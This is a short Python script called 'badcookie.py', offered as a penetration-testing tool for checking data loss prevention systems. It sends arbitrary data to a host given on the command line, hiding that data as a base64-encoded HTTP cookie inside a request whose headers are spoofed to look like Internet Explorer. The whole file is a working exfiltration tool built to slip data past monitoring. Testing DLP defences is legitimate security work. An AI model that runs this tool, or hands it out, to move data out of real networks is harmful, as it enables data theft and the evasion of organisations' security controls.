#!/usr/bin/python

import sys
import base64
import requests

print """
#################################################################
# Description: Exfiltrates data via base64 encoded HTTP cookies # 
# Use Case: Penetration testing e.g. testing DLP systems etc	#
# Author: Akbar Qureshi						#
#################################################################
"""
if len(sys.argv) < 3:
    print 'Usage: badcookie.py <destination_host> <exfiltrated_data>'
    print '\nExample(1): badcookie.py 10.0.0.2 "very important data"'  
    print 'Example(2): badcookie.py www.secretsite.com "very important data"'
    print '\n'
    sys.exit(1)

try:

    # Spoofing Internet Explorer Header
    url = 'http://%s' % sys.argv[1]
    headers = { 
        'Accept': 'text/html, application/xhtml+xml, */*',
        'Accept-Language': 'en-US',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; :11.0) like Gecko',
        'Accept-Encoding': 'gzip, deflate',
        'Host': '%s' % sys.argv[1],
        'DNT': '1',
        'Connection': 'Keep-Alive',
        'Cookie': '%s' % base64.b64encode(sys.argv[2]), # plain text converted to base64 encoding
        }
    r = requests.get(url, headers=headers)
    print 'Message sent - Got HTTP Response Code %s' % r.status_code

except Exception, e:
    print e
    sys.exit(1)
